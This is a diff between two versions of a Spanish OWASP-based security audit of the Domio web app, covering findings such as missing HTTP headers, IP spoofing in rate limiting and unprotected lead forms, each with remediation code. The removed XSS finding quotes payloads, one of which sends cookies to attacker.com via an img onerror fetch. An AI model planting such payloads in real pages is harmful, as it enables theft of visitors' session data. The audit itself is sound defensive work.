@@ -1,465 +1,377 @@
 # Security Report — Domio
 
 > Generado por: security-auditor
-> Fecha: 2026-07-09
+> Fecha: 2026-07-13
 > Basado en: OWASP Top 10 2025
+> Informe anterior: security-report-2026-07-10.md
 
 ---
 
 ## 1. Executive Summary
 
-**Nivel de riesgo global:** Alto
+**Nivel de riesgo global:** Medio
 
-**Estado general:** La aplicación tiene una arquitectura de seguridad sólida en muchos aspectos — tenant isolation via RLS, bcrypt para contraseñas y API keys, validación Zod en todas las entradas, rate limiting implementado. Sin embargo, existen tres problemas concretos y verificables: el rate limiting de login está implementado pero no está conectado al flujo de autenticación, el middleware de autenticación realiza una validación de formato JWT superficial en vez de verificar la firma criptográfica, y el HTML con `dangerouslySetInnerHTML` en contenido editable carece de sanitización de atributos (solo valida nombres de etiquetas). Estos tres puntos tienen impacto real y requieren remediación.
+**Estado general:** La aplicación presenta una postura de seguridad razonablemente madura en autenticación, multi-tenancy (RLS + contextos) y protección de formularios públicos principales. Sin embargo, se han identificado vulnerabilidades de severidad alta relacionadas con un server action público sin protecciones anti-spam, ausencia total de headers de seguridad HTTP, spoofing de IP en el rate limiting, y un endpoint de revalidación de caché que acepta tags arbitrarios. No se hallaron secrets hardcodeados ni vulnerabilidades críticas de inyección.
 
 **Hallazgos por severidad:**
 | Severidad | Cantidad |
 |-----------|----------|
 | Crítica | 0 |
-| Alta | 3 |
+| Alta | 4 |
 | Media | 4 |
 | Baja | 3 |
 | Informativa | 2 |
 
 **Superficie de ataque identificada:**
-- `/panel/login` — endpoint de autenticación (credenciales)
-- `/api/auth/[...nextauth]` — NextAuth handler (GET + POST)
-- `/api/internal/*` — APIs backoffice autenticadas (sesión JWT)
-- `/api/v1/promociones` — API pública autenticada (API Key)
-- `/api/v1/leads/institutional` — API pública autenticada (API Key)
-- `/api/internal/media/upload` — upload de ficheros
-- Server Actions públicas: `createLeadAction`, `submitContactForm`
-- Formularios públicos: contacto, lead desde detalle de inmueble
+- 2 endpoints API públicos v1 (autenticados por API key)
+- 12 endpoints API internos (autenticados por sesión)
+- 3 server actions públicos (formularios de contacto y leads)
+- 1 endpoint de upload de medios (autenticado)
+- 1 endpoint de health público
+- 1 endpoint de revalidación de caché (autenticado)
+- Cloudflare Turnstile en formularios públicos (principal)
+- Cloudflare R2 para almacenamiento de medios
+- Resend para envío de emails transaccionales
+- Sentry para observabilidad
+- Upstash Redis para rate limiting
 
 ---
 
-## 2. Hallazgos Altos
+## 2. Hallazgos Críticos
 
-### [HIGH-01] Rate Limiting de Login implementado pero nunca invocado
+_No se identificaron hallazgos de severidad crítica._
 
-**Categoría OWASP 2025:** A07:2025 — Authentication Failures
+---
+
+## 3. Hallazgos Altos
+
+### [HIGH-01] Server action `createLeadAction` sin CAPTCHA ni rate limiting
+
+**Categoría OWASP 2025:** A06:2025 — Insecure Design
 **Severidad:** Alta
 **Explotabilidad:** Fácil
-**Archivos afectados:** `src/infrastructure/auth/rate-limit-login.ts` (línea 22), `src/infrastructure/auth/auth.config.ts` (función `authorize`)
+**Archivos afectados:** `src/features/leads/actions/leads.actions.ts:229-305`
 
-**Descripción:** La función `checkLoginRateLimit` está completamente implementada, tiene tests, y está documentada con un ejemplo de uso en su JSDoc. Sin embargo, nunca se llama desde `auth.config.ts:authorize`. El callback `authorize` de NextAuth solo verifica email/password contra la base de datos sin ningún control de brute-force, lo que permite intentos de login ilimitados contra cualquier cuenta.
+**Descripción:** El server action `createLeadAction` (exportado desde `leads.actions.ts`) es un endpoint público para crear leads desde formularios que NO incluye verificación Turnstile CAPTCHA ni rate limiting. Existe un segundo `createLeadAction` en `src/features/engagement/server/create-lead-action.ts` que sí tiene ambas protecciones, pero esta versión alternativa carece de ellas completamente.
 
 **Escenario de ataque:**
-1. El atacante obtiene una lista de emails de usuarios (por ejemplo, via enumeración de errores distintos en el form de login o social engineering).
-2. Lanza un script de credential stuffing o brute-force con listas de contraseñas comunes contra `/api/auth/[...nextauth]` con método POST y `action=credentials`.
-3. No existe ningún bloqueo por IP ni throttling. Con 5 intentos/segundo puede probar 432.000 contraseñas en 24 horas.
-4. Una cuenta comprometida da acceso completo al backoffice del tenant.
+1. Un atacante identifica el server action `createLeadAction` (es exportado y potencialmente invocable desde el cliente).
+2. Ejecuta un script que envía miles de requests de creación de leads con datos falsos.
+3. Sin CAPTCHA ni rate limit, cada request crea un lead + consent record + encola 2 emails (confirmación al lead + notificación al agente).
+4. Impacto: agotamiento de la cola de emails, spam en las bandejas de entrada de agentes, saturación de la base de datos, y degradación del servicio.
 
 **Evidencia en código:**
-
 ```ts
-// src/infrastructure/auth/rate-limit-login.ts — función existe pero NUNCA se llama
-export async function checkLoginRateLimit(headers: Headers): Promise<Response | null> {
-  // ...implementación correcta...
-}
-
-// src/infrastructure/auth/auth.config.ts:authorize — sin ninguna llamada a checkLoginRateLimit
-async authorize(credentials) {
-  const email = credentials?.email as string | undefined;
-  const password = credentials?.password as string | undefined;
-  if (!email || !password) return null;
-  // ... bcrypt compare directo, sin rate limit
+// src/features/leads/actions/leads.actions.ts:229
+export async function createLeadAction(formData: FormData) {
+  // 1. Parse and validate input — SIN Turnstile
+  // 2. Get IP and user-agent — SIN rate limiting
+  // 3. Create lead + consent record — directo a BD + email queue
+  const ctx = new PublicContext();
+  const result = await ctx.withTransaction(async (tx) => {
+    // ... inserta lead + consent + encola emails
+  });
 }
 ```
 
 **Remediación:**
-
-En `auth.config.ts`, dentro del callback `authorize`, añadir la llamada al rate limiter. NextAuth v4 `authorize` no recibe `request` directamente, pero se puede acceder a los headers desde el contexto si se pasan como credentials ocultas, o utilizar el evento `signIn` de NextAuth:
-
+Eliminar este server action duplicado si no se usa, o añadirle las mismas protecciones que tiene la versión en `engagement/server/create-lead-action.ts`:
 ```ts
-// Opción más directa: añadir el check en las páginas de login que invocan
-// signIn('credentials', ...) o en un middleware de API separado.
-// En NextAuth v4, la forma más limpia es via el callback "signIn":
+// 1. Verificar Turnstile
+const turnstileResult = await verifyTurnstileToken(formData.get("turnstileToken"));
+if (!turnstileResult.success) return { success: false, error: "..." };
 
-callbacks: {
-  async signIn({ user, account, credentials }) {
-    if (account?.provider === "credentials") {
-      // checkLoginRateLimit requiere Headers — pasarlos desde el form
-      // o usar un in-memory store por IP extraída de x-forwarded-for
-    }
-    return true;
-  }
-}
-
-// Alternativa robusta: mover la lógica al Server Action de login
-// que llama a signIn() desde el formulario:
-export async function loginAction(formData: FormData) {
-  const headersList = await headers();
-  const ip = extractIpFromHeaders(headersList);
-  const rateLimitResult = await checkIpRateLimit(ip, "login");
-  if (!rateLimitResult.allowed) {
-    return { error: "Demasiados intentos. Inténtalo más tarde." };
-  }
-  return signIn("credentials", { ...formData });
-}
+// 2. Rate limiting
+const headersList = await headers();
+const ip = extractIpFromHeaders(headersList);
+const rateResult = await checkIpRateLimit(ip, "contact");
+if (!rateResult.allowed) return { success: false, error: "..." };
 ```
 
-**Coste fix:** 2-4 horas
+**Coste fix:** Muy Bajo (1h)
 
 ---
 
-### [HIGH-02] Middleware autentica por formato de cookie JWT, no por firma criptográfica
-
-**Categoría OWASP 2025:** A07:2025 — Authentication Failures
-**Severidad:** Alta
-**Explotabilidad:** Moderada
-**Archivos afectados:** `middleware.ts` (líneas 27-35)
-
-**Descripción:** El middleware que protege todas las rutas `/panel/*` realiza únicamente una validación de **formato** del token JWT (comprueba que el valor de la cookie tenga 3 segmentos separados por puntos con caracteres base64url). No verifica la firma criptográfica del JWT con el `AUTH_SECRET`. Cualquier valor que coincida con el regex `^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$` pasará el guard del middleware y accederá a las rutas `/panel/*`.
-
-El comentario en el código reconoce que esto es solo "basic JWT format validation", asumiendo que la sesión completa se valida en los layouts y server actions. En la práctica esto es correcto, ya que `PanelLayout` hace un segundo check con `getServerSession()`. Sin embargo, si alguna ruta de panel no pasa por el layout (edge cases con `not-found`, `error` boundaries, páginas `loading`), el middleware es la única barrera.
-
-**Escenario de ataque:**
-1. Atacante construye un JWT falso con cualquier payload firmado con una clave arbitraria: `eyJhbGc...eyJ1c2Vy...FIRMA_FALSA`.
-2. Coloca este valor en la cookie `next-auth.session-token`.
-3. El middleware lo acepta (3 partes base64url) y no redirige a `/panel/login`.
-4. Si una ruta `/panel/*/` tiene algún path que ejecute código sin pasar por `getServerSession()` (por ejemplo, un `loading.tsx` que exponga datos), ese código se ejecuta sin autenticación real.
-
-**Evidencia en código:**
-
-```ts
-// middleware.ts:27-35
-const sessionCookie = request.cookies.get("next-auth.session-token");
-const cookieValue = sessionCookie?.value ?? "";
-// Solo valida formato, NO la firma criptográfica:
-const isValidFormat = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(cookieValue);
-
-if (!isValidFormat) {
-  // Solo se bloquea si el formato no es de JWT
-  const loginUrl = new URL("/panel/login", request.url);
-  return NextResponse.redirect(loginUrl);
-}
-```
-
-**Remediación:**
-
-Usar el wrapper `auth` de NextAuth v4 para verificar criptográficamente la sesión en el middleware. NextAuth provee `getToken` que verifica la firma del JWT:
-
-```ts
-import { getToken } from "next-auth/jwt";
-
-export async function middleware(request: NextRequest) {
-  const { pathname } = request.nextUrl;
-
-  if (pathname.startsWith("/panel") && !pathname.startsWith("/panel/login")) {
-    // Verificación criptográfica real del JWT
-    const token = await getToken({
-      req: request,
-      secret: process.env.AUTH_SECRET,
-    });
-
-    if (!token) {
-      return NextResponse.redirect(new URL("/panel/login", request.url));
-    }
-  }
-  // ... resto del middleware
-}
-```
-
-**Coste fix:** 1-2 horas
-
----
-
-### [HIGH-03] XSS Stored — Atributos HTML no sanitizados en DESCRIPCION_GENERAL
-
-**Categoría OWASP 2025:** A05:2025 — Injection (XSS)
-**Severidad:** Alta
-**Explotabilidad:** Moderada (requiere acceso autenticado al backoffice)
-**Archivos afectados:** `src/shared/types/content-block-schema.ts` (líneas 20-32), `src/features/detail/components/BlockDescripcion.tsx` (línea 32)
-
-**Descripción:** La validación del campo HTML para el bloque `DESCRIPCION_GENERAL` comprueba si los **nombres de etiquetas** están en la lista de permitidos (`b`, `i`, `p`, `a`, `strong`, etc.), pero **no valida los atributos de esas etiquetas**. Esto permite inyectar handlers de eventos (`onclick`, `onerror`, `onmouseover`) o el protocolo `javascript:` en atributos `href` de etiquetas `<a>` permitidas.
-
-El contenido pasa directamente a `dangerouslySetInnerHTML` en la página pública de detalle de inmueble, visible para todos los visitantes.
-
-**Escenario de ataque:**
-1. Un usuario con rol ADMIN u OPERATOR accede al backoffice (`/panel/catalogo/{id}`).
-2. Edita el bloque "Descripción general" e introduce: `<a href="javascript:document.cookie='stolen='+document.cookie">Click aquí</a>` o `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">`.
-3. La validación Zod confirma que `<a>` y `<img>` son etiquetas permitidas y acepta el payload.
-4. El bloque se publica y aparece en la página pública `/inmuebles/{slug}`.
-5. Cualquier visitante que haga clic (o simplemente cargue la página si usa `onerror`) ejecuta el JavaScript malicioso, robando sus cookies (aunque las de NextAuth son `httpOnly`, pueden afectar cookies de terceros, sessionStorage, o redirigir al usuario).
-
-**Evidencia en código:**
-
-```ts
-// src/shared/types/content-block-schema.ts:20-32
-function validateAllowedHtml(value: string): boolean {
-  const tagRegex = /<\/?([a-z][a-z0-9]*)\b[^>]*>/gi;
-  // PROBLEMA: solo extrae el nombre de la etiqueta, ignora atributos
-  while ((match = tagRegex.exec(value)) !== null) {
-    const tagName = match[1]!.toLowerCase();
-    if (!ALLOWED_HTML_TAGS_SET.has(tagName)) return false;
-  }
-  return true;
-  // <a href="javascript:alert(1)"> pasa la validación (tagName="a" está permitido)
-}
-
-// src/features/detail/components/BlockDescripcion.tsx:32
-dangerouslySetInnerHTML={{ __html: text }}
-```
-
-**Remediación:**
-
-Añadir una sanitización completa de atributos en la validación. La forma más segura es usar una librería de sanitización HTML como `sanitize-html` con allowlist de atributos, o ampliar el regex para rechazar cualquier atributo que sea un event handler o contenga `javascript:`:
-
-```ts
-// Opción 1: Añadir validación de atributos peligrosos
-function validateAllowedHtml(value: string): boolean {
-  // Rechazar event handlers
-  if (/\bon\w+\s*=/i.test(value)) return false;
-  // Rechazar javascript: en atributos href/src/action
-  if (/\bhref\s*=\s*["']?\s*javascript:/i.test(value)) return false;
-  if (/\bsrc\s*=\s*["']?\s*javascript:/i.test(value)) return false;
-  // Rechazar data: URIs en atributos
-  if (/\bhref\s*=\s*["']?\s*data:/i.test(value)) return false;
-
-  const tagRegex = /<\/?([a-z][a-z0-9]*)\b[^>]*>/gi;
-  // ... validación de tags existente
-}
-
-// Opción 2 (más robusta): instalar sanitize-html y usarlo en el backend
-// antes de guardar el payload, garantizando que el HTML nunca llega
-// corrupto a la base de datos
-import sanitizeHtml from "sanitize-html";
-const safe = sanitizeHtml(value, {
-  allowedTags: ["b", "i", "u", "p", "br", "ul", "ol", "li", "strong", "em", "a"],
-  allowedAttributes: { "a": ["href", "title"] },
-  allowedSchemes: ["http", "https", "mailto"],
-});
-```
-
-**Coste fix:** 2-4 horas
-
----
-
-## 3. Hallazgos Medios
-
-### [MED-01] Ausencia de headers de seguridad HTTP (CSP, HSTS, X-Frame-Options)
+### [HIGH-02] Ausencia total de headers de seguridad HTTP
 
 **Categoría OWASP 2025:** A02:2025 — Security Misconfiguration
-**Severidad:** Media
-**Explotabilidad:** Moderada
+**Severidad:** Alta
+**Explotabilidad:** Fácil
 **Archivos afectados:** `next.config.ts`, `middleware.ts`
 
-**Descripción:** La aplicación no configura ningún header de seguridad HTTP estándar. Una revisión de `next.config.ts` y `middleware.ts` confirma la ausencia de:
-- `Content-Security-Policy` — permite cargar recursos de cualquier origen y ejecutar scripts inline
-- `X-Frame-Options` o `frame-ancestors` en CSP — la aplicación puede ser incrustada en iframes (clickjacking)
-- `Strict-Transport-Security` — no fuerza HTTPS
-- `X-Content-Type-Options` — permite MIME sniffing
+**Descripción:** La aplicación no configura ningún header de seguridad HTTP. No hay `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, ni `Permissions-Policy` en ninguna respuesta. Esto expone la aplicación a clickjacking, MIME-sniffing, y otros ataques que los headers de seguridad mitigan.
+
+**Escenario de ataque:**
+1. **Clickjacking**: Un atacante incrusta la página de login del panel en un iframe de un sitio malicioso. Sin `X-Frame-Options: DENY`, el usuario puede ser engañado para hacer clic en elementos invisibles superpuestos.
+2. **MIME sniffing**: Sin `X-Content-Type-Options: nosniff`, un navegador puede interpretar un archivo subido como ejecutable si el MIME type es manipulado.
+3. **Downgrade HTTPS**: Sin `Strict-Transport-Security`, un usuario en una red WiFi pública puede ser víctima de un ataque MITM que degrade la conexión a HTTP.
+
+**Evidencia en código:**
+```ts
+// next.config.ts — sin headers configurados
+const nextConfig: NextConfig = {
+  reactStrictMode: true,
+  output: "standalone",
+  images: { /* ... */ },
+  // NO hay configuración de headers de seguridad
+};
+
+// middleware.ts — solo añade X-Robots-Tag para /panel y /api/internal
+// NO hay headers de seguridad globales
+```
 
 **Remediación:**
-
+Añadir headers de seguridad en `next.config.ts`:
 ```ts
-// next.config.ts
-const securityHeaders = [
-  { key: "X-Frame-Options", value: "DENY" },
-  { key: "X-Content-Type-Options", value: "nosniff" },
-  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
-  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
-  {
-    key: "Content-Security-Policy",
-    value: [
-      "default-src 'self'",
-      "script-src 'self' 'unsafe-inline'",  // nextjs requiere inline; usar nonce en producción
-      "style-src 'self' 'unsafe-inline'",
-      "img-src 'self' data: https:",
-      "connect-src 'self' https://sentry.io",
-      "frame-ancestors 'none'",
-    ].join("; "),
-  },
-  // En producción añadir: { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" }
-];
-
 const nextConfig: NextConfig = {
+  // ... existing config
   async headers() {
-    return [{ source: "/(.*)", headers: securityHeaders }];
+    return [
+      {
+        source: "/(.*)",
+        headers: [
+          { key: "X-Frame-Options", value: "DENY" },
+          { key: "X-Content-Type-Options", value: "nosniff" },
+          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+          { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
+          { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
+        ],
+      },
+    ];
   },
 };
 ```
+Para CSP, evaluar el uso de nonces en server components o un CSP estricto basado en allowlists.
 
-**Coste fix:** 3-5 horas (incluye pruebas para verificar que no rompe la aplicación)
+**Coste fix:** Bajo (2-4h)
 
 ---
 
-### [MED-02] Rate Limiting silenciosamente deshabilitado sin `RATE_LIMIT_STORE_URL`
+### [HIGH-03] IP Spoofing en rate limiting — header `x-forwarded-for` no verificado
 
-**Categoría OWASP 2025:** A06:2025 — Insecure Design / A10:2025 — Mishandling of Exceptional Conditions
-**Severidad:** Media
-**Explotabilidad:** Fácil (si el env var no está configurado en producción)
-**Archivos afectados:** `src/infrastructure/rate-limiting/rate-limiter.factory.ts` (líneas 9-30)
+**Categoría OWASP 2025:** A01:2025 — Broken Access Control
+**Severidad:** Alta
+**Explotabilidad:** Moderada
+**Archivos afectados:** `src/shared/utils/extract-ip.ts:11-24`, `src/infrastructure/rate-limiting/ip-rate-limit.ts`
 
-**Descripción:** Cuando `RATE_LIMIT_STORE_URL` no está definido, la factory devuelve un `NoopRateLimiter` que permite **todas las peticiones sin límite**. Esto es un comportamiento fail-open: si por error de configuración el env var no está presente en producción, el rate limiting de login y de formularios de contacto queda completamente desactivado sin ninguna alerta. El `.env.local` del repositorio tiene `RATE_LIMIT_STORE_URL=` vacío, lo que activa el modo no-op.
+**Descripción:** La función `extractIpFromHeaders` extrae la IP del cliente directamente del header `x-forwarded-for` sin verificar si la request proviene de un proxy confiable. Un atacante puede enviar un header `x-forwarded-for: 1.2.3.4` arbitrario para bypasear el rate limiting, ya que cada request con una IP diferente consume un bucket separado.
 
-**Remediación:**
+**Escenario de ataque:**
+1. Un atacante quiere bypasear el rate limit de login (5 intentos / 15 min).
+2. Envía requests POST a `/api/auth/callback/credentials` con el header `X-Forwarded-For: <random-ip>` diferente en cada request.
+3. Cada IP "falsa" tiene su propio bucket de rate limit, permitiendo fuerza bruta ilimitada contra las credenciales de un usuario.
+4. Lo mismo aplica para los formularios de contacto y lead.
 
+**Evidencia en código:**
 ```ts
-// src/infrastructure/rate-limiting/rate-limiter.factory.ts
-export function createRateLimiter(): RateLimiter {
-  const redis = getRedisClient();
-
-  if (!redis) {
-    // En producción, fallar en lugar de silenciar el error
-    if (process.env.NODE_ENV === "production") {
-      // Usar un limiter en memoria como fallback (no distribuido pero mejor que noop)
-      logger.warn("RATE_LIMIT_STORE_URL not configured in production. Using in-memory fallback.");
-      return new InMemoryRateLimiter(); // implementar uno simple
-    }
-    // En desarrollo, noop es aceptable
-    return new NoopRateLimiter();
+// src/shared/utils/extract-ip.ts
+export function extractIpFromHeaders(headers: Headers): string {
+  const forwarded = headers.get("x-forwarded-for");
+  if (forwarded) {
+    const firstIp = forwarded.split(",")[0];
+    return firstIp ? firstIp.trim() : forwarded.trim();
   }
-
-  return new UpstashRateLimiter(redis);
+  // ...
 }
 ```
 
-Además, añadir una verificación de entorno al arrancar la aplicación (`instrumentation.ts`) que lance un warning visible si `RATE_LIMIT_STORE_URL` está vacío en producción.
+**Remediación:**
+En entornos detrás de proxy inverso (Vercel, Cloudflare), configurar el número de proxies confiables y usar el IP real del socket:
+```ts
+// En Vercel, el IP real está en x-forwarded-for pero la posición correcta
+// depende del número de proxies. Con Next.js en Vercel:
+export function extractIpFromHeaders(headers: Headers): string {
+  const forwarded = headers.get("x-forwarded-for");
+  if (forwarded) {
+    const ips = forwarded.split(",").map(ip => ip.trim());
+    // En Vercel, el último IP es el del cliente (el primero es el proxy)
+    // Ajustar según la infraestructura real
+    return ips[ips.length - 1] ?? "unknown";
+  }
+  return headers.get("x-real-ip") ?? "unknown";
+}
+```
+Alternativamente, usar el `request.ip` que Next.js provee en route handlers cuando está detrás de un proxy confiable.
 
-**Coste fix:** 2-3 horas
+**Coste fix:** Bajo (2h)
 
 ---
 
-### [MED-03] Validación de MIME type en upload basada en cabecera del cliente
+### [HIGH-04] Endpoint de revalidación de caché acepta tags arbitrarios
+
+**Categoría OWASP 2025:** A06:2025 — Insecure Design
+**Severidad:** Alta
+**Explotabilidad:** Moderada (requiere sesión autenticada)
+**Archivos afectados:** `app/api/internal/revalidate/route.ts:21-51`
+
+**Descripción:** El endpoint POST `/api/internal/revalidate` acepta un array `tags` definido por el cliente y llama a `revalidateTag()` para cada uno. Aunque requiere autenticación, cualquier usuario autenticado (incluyendo roles AGENT) puede invalidar cualquier tag del sistema, causando un cache stampede donde todas las páginas se regeneran simultáneamente.
+
+**Escenario de ataque:**
+1. Un usuario con rol AGENT (el menos privilegiado) envía POST a `/api/internal/revalidate` con `tags: ["catalog", "layout:public", "contact:global"]`.
+2. Todos los caches de la página pública se invalidan.
+3. Los siguientes cientos de requests concurrentes regeneran todas las páginas SSR simultáneamente.
+4. Impacto: degradación severa del rendimiento, posible timeout de la base de datos por carga repentina.
+
+**Evidencia en código:**
+```ts
+// app/api/internal/revalidate/route.ts
+export async function POST(request: NextRequest) {
+  const auth = await requireAuth();
+  if (!auth.authorized) return auth.response;
+
+  const body = (await request.json().catch(() => null)) as { tags?: string[] } | null;
+  const tags = body?.tags ?? ["catalog", "contact:global", "layout:public"];
+
+  for (const tag of tags) {
+    revalidateTag(tag); // Acepta CUALQUIER string como tag
+  }
+}
+```
+
+**Remediación:**
+Restringir los tags válidos a un allowlist explícito y limitar el acceso a ADMIN/OPERATOR:
+```ts
+const ALLOWED_REVALIDATE_TAGS = new Set([
+  "catalog", "contact:global", "layout:public",
+]);
+
+export async function POST(request: NextRequest) {
+  const auth = await requireAuth();
+  if (!auth.authorized) return auth.response;
+
+  // Solo ADMIN y OPERATOR pueden revalidar
+  if (auth.ctx.role !== "ADMIN" && auth.ctx.role !== "OPERATOR") {
+    return Response.json({ error: "Forbidden" }, { status: 403 });
+  }
+
+  const body = await request.json().catch(() => null);
+  const requestedTags = body?.tags ?? ["catalog", "contact:global", "layout:public"];
+  const tags = requestedTags.filter((t: string) => ALLOWED_REVALIDATE_TAGS.has(t));
+
+  for (const tag of tags) {
+    revalidateTag(tag);
+  }
+}
+```
+
+**Coste fix:** Muy Bajo (1h)
+
+---
+
+## 4. Hallazgos Medios
+
+### [MED-01] JWT sin invalidación server-side tras desactivación de usuario
+
+**Categoría OWASP 2025:** A07:2025 — Authentication Failures
+**Severidad:** Media
+**Explotabilidad:** Moderada
+**Archivos afectados:** `src/infrastructure/auth/auth.config.ts:107-111`, `src/infrastructure/auth/session.ts`
+
+**Descripción:** La aplicación usa JWT con estrategia `jwt` de NextAuth. Los tokens tienen una vida de 2 horas con renovación deslizante cada hora. Sin embargo, no existe mecanismo para invalidar tokens específicos antes de su expiración natural. Si un ADMIN desactiva un usuario (`isActive = false`), el token JWT del usuario sigue siendo válido hasta que expire (hasta 2 horas), durante las cuales puede seguir accediendo al panel.
+
+**Remediación:** Implementar una lista de tokens revocados en Redis con TTL igual al tiempo de vida restante del token, o reducir el `maxAge` del JWT y verificar `isActive` en cada request (no solo en el login). Alternativamente, usar `updateAge: 0` para forzar verificación en cada request.
+
+**Coste fix:** Medio (4-6h)
+
+---
+
+### [MED-02] Sanitización HTML allowlist permite atributos `style` en todos los tags
 
 **Categoría OWASP 2025:** A05:2025 — Injection
 **Severidad:** Media
-**Explotabilidad:** Moderada (requiere acceso autenticado)
-**Archivos afectados:** `app/api/internal/media/upload/route.ts` (líneas 66-77)
+**Explotabilidad:** Difícil (requiere rol OPERATOR/ADMIN)
+**Archivos afectados:** `src/shared/types/content-block-schema.ts:45-81`
 
-**Descripción:** La validación del tipo MIME del fichero subido (`fileField.type`) lee el `Content-Type` que declara el cliente en el FormData. Un cliente malicioso puede enviar un fichero JavaScript o ejecutable declarando `Content-Type: image/jpeg`. La aplicación acepta esto como válido y lo sube a R2, aunque posteriormente no lo sirva directamente como ejecutable. El problema es que los ficheros de tipo `application/pdf` y `text/csv` también están permitidos — un PDF con JavaScript embebido puede ejecutarse si el bucket R2 lo sirve con Content-Type incorrecto.
+**Descripción:** La función `sanitizeHtmlAttrs` permite los atributos `style` y `class` en TODOS los tags HTML (línea 75: `return attrName === "style" || attrName === "class"`). Aunque los tags están restringidos a un allowlist y se bloquean event handlers y URLs peligrosas, un operador con permisos de edición de contenido podría inyectar CSS malicioso via el atributo `style`. Esto incluye `background-image: url(...)` para tracking pixels, `@import` para exfiltración, o técnicas CSS de exfiltración de datos.
 
-**Remediación:**
-
-Añadir inspección de magic bytes (primeros bytes del contenido del fichero) para verificar que el contenido real coincide con el MIME declarado:
-
+**Evidencia en código:**
 ```ts
-// Validación de magic bytes después de leer el buffer
-function detectMimeType(buffer: Buffer): string | null {
-  // JPEG: FF D8 FF
-  if (buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF) return "image/jpeg";
-  // PNG: 89 50 4E 47
-  if (buffer[0] === 0x89 && buffer[1] === 0x50) return "image/png";
-  // PDF: 25 50 44 46
-  if (buffer.slice(0, 4).toString() === "%PDF") return "application/pdf";
-  // WebP: RIFF...WEBP
-  if (buffer.slice(0, 4).toString() === "RIFF" && buffer.slice(8, 12).toString() === "WEBP") return "image/webp";
-  return null;
-}
-
-// En el handler, después de convertir File a Buffer:
-const detectedMime = detectMimeType(fileBuffer);
-if (detectedMime !== fields.file!.type) {
-  return validationErrorResponse([{ field: "file", message: "File content does not match declared type" }]);
-}
+// src/shared/types/content-block-schema.ts:74-75
+// Tags without explicit allowlist: only keep style and class attributes
+return attrName === "style" || attrName === "class";
 ```
 
-Alternativamente, usar la librería `file-type` que hace esto correctamente.
+**Remediación:** Eliminar `style` del allowlist general, o implementar un parser CSS que filtre propiedades peligrosas. La opción más segura es eliminar `style` completamente y usar solo clases CSS predefinidas.
 
-**Coste fix:** 2-4 horas
+**Coste fix:** Bajo (2h)
 
 ---
 
-### [MED-04] Lead público puede referenciar una promoción de cualquier tenant
+### [MED-03] Ausencia de logs de seguridad estructurados
 
-**Categoría OWASP 2025:** A01:2025 — Broken Access Control
+**Categoría OWASP 2025:** A09:2025 — Security Logging & Alerting Failures
 **Severidad:** Media
-**Explotabilidad:** Fácil
-**Archivos afectados:** `src/features/engagement/server/create-lead-action.ts` (líneas 97-107)
+**Explotabilidad:** N/A (no explotable, pero impide la detección de ataques)
+**Archivos afectados:** Global
 
-**Descripción:** La función `createLeadService` ejecuta en un contexto `PublicContext` cuyo `tenantId` es el tenant público (`PUBLIC_TENANT_ID`). Sin embargo, al buscar la promoción para validarla, la query NO filtra por `tenantId`:
+**Descripción:** No hay evidencia de logs estructurados para eventos de seguridad críticos: login exitoso/fallido, logout, cambio de password, desactivación de usuario, creación/revocación de API keys, acceso a datos sensibles, operaciones de administración. Los logs existentes usan `logger.error` y `logger.warn` para errores técnicos, pero no para eventos de seguridad.
 
-```ts
-const [promocion] = await tx
-  .select({ id: promociones.id, name: promociones.name, assignedAgentId: promociones.assignedAgentId })
-  .from(promociones)
-  .where(eq(promociones.id, promocionId))  // ← SIN filtro de tenant
-  .limit(1);
-```
+**Remediación:** Implementar un audit logger que registre eventos de seguridad con: timestamp, userId, tenantId, eventType, resource, outcome, ip, userAgent. Enviar a un sistema de agregación (Sentry ya está configurado, pero los eventos de seguridad deberían tratarse como breadcrumbs con contexto enriquecido).
 
-En la arquitectura actual la aplicación es single-tenant (un tenant único), por lo que el impacto práctico es nulo hoy. Sin embargo, si en el futuro se añaden múltiples tenants o si hay una misconfiguration de `PUBLIC_TENANT_ID`, un atacante podría crear leads asociados a promociones de otros tenants, contaminando sus datos y disparando emails de notificación a agentes de otros tenants.
-
-**Remediación:**
-
-```ts
-const [promocion] = await tx
-  .select({ id: promociones.id, name: promociones.name, assignedAgentId: promociones.assignedAgentId })
-  .from(promociones)
-  .where(
-    and(
-      eq(promociones.id, promocionId),
-      eq(promociones.tenantId, ctx.getTenantId()),  // ← Añadir filtro de tenant
-      eq(promociones.status, "PUBLISHED"),           // ← Añadir filtro de estado
-    )
-  )
-  .limit(1);
-```
-
-**Coste fix:** 30 minutos
+**Coste fix:** Alto (8-16h)
 
 ---
 
-## 4. Hallazgos Bajos
-
-### [LOW-01] IP extraída de headers sin validar — posible bypass de rate limiting
-
-**Categoría OWASP 2025:** A06:2025 — Insecure Design
-**Severidad:** Baja
-**Archivos afectados:** `src/shared/utils/extract-ip.ts`, `src/features/engagement/server/create-lead-action.ts` (línea 67)
-
-**Descripción:** La función `extractIpFromHeaders` toma el valor de `X-Forwarded-For` sin validar si proviene de un proxy de confianza. En un entorno sin proxy reverso delante (o con configuración incorrecta), un cliente puede enviar `X-Forwarded-For: 127.0.0.1` para suplantar una IP de loopback y eludir el rate limiting por IP. El riesgo es bajo si el despliegue siempre usa Cloudflare o un load balancer que inyecta estos headers, pero el código no hace ninguna distinción.
-
-**Remediación:** En producción, configurar el servidor para que solo acepte `X-Forwarded-For` de IPs de proxy conocidas (lista blanca de Cloudflare/Vercel IPs). Documentar el requisito de despliegue en README.
-
----
-
-### [LOW-02] Contraseña de demo hardcoded en seed script
-
-**Categoría OWASP 2025:** A04:2025 — Cryptographic Failures
-**Severidad:** Baja
-**Archivos afectados:** `scripts/seed.ts` (línea 35)
-
